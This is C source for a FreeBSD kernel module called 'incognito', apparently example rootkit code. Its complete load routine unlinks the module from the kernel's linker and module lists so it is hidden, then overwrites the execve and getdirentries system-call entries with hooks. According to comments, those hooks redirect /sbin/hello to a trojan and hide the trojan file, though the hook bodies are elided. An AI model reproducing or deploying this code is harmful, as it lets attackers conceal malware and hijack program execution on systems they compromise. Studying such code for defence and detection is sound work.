#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>
#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>
#include <dirent.h>
#define ORIGINAL "/sbin/hello"
#define TROJAN "/sbin/trojan_hello"
#define T_NAME "trojan_hello"
#define VERSION "incognito-0.3.ko"
/*
* The following is the list of variables you need to reference in order
* to hide this module, which aren't defined in any header files.
*/
extern linker_file_list_t linker_files;
extern struct mtx kld_mtx;
extern int next_file_id;
typedef TAILQ_HEAD(, module) modulelist_t;
extern modulelist_t modules;
extern int nextid;
struct module {
    TAILQ_ENTRY(module) link; /* chain together all modules */
    TAILQ_ENTRY(module) flink; /* all modules in a file */
    struct linker_file *file; /* file which contains this module */
    int refs; /* reference count */
    int id; /* unique id number */
    char *name; /* module name */
    modeventhand_t handler; /* event handler */
    void *arg; /* argument for handler */
    modspecific_t data; /* module specific data */
};
/*
* execve system call hook.
* Redirects the execution of ORIGINAL into TROJAN.
*/
static int
execve_hook(struct thread *td, void *syscall_args)
{
. . .
}
/*
* getdirentries system call hook.
* Hides the file T_NAME.
*/
static int
getdirentries_hook(struct thread *td, void *syscall_args)
{
. . .
}
/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg)
{
    struct linker_file *lf;
    struct module *mod;
    mtx_lock(&Giant);
    mtx_lock(&kld_mtx);
/* Decrement the current kernel image's reference count. */
    (&linker_files)->tqh_first->refs--;
/*
* Iterate through the linker_files list, looking for VERSION.
* If found, decrement next_file_id and remove from list.
*/
    TAILQ_FOREACH(lf, &linker_files, link) {
        if (strcmp(lf->filename, VERSION) == 0) {
            next_file_id--;
            TAILQ_REMOVE(&linker_files, lf, link);
            break;
        }
    }
    mtx_unlock(&kld_mtx);
    mtx_unlock(&Giant);
    sx_xlock(&modules_sx);
/*
* Iterate through the modules list, looking for "incognito."
* If found, decrement nextid and remove from list.
*/
    TAILQ_FOREACH(mod, &modules, link) {
        if (strcmp(mod->name, "incognito") == 0) {
            nextid--;
            TAILQ_REMOVE(&modules, mod, link);
            break;
        }
     }
    sx_xunlock(&modules_sx);
    sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
    sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
    return(0);
}
static moduledata_t incognito_mod = {
    "incognito", /* module name */
    load, /* event handler */
    NULL /* extra data */
};
DECLARE_MODULE(incognito, incognito_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
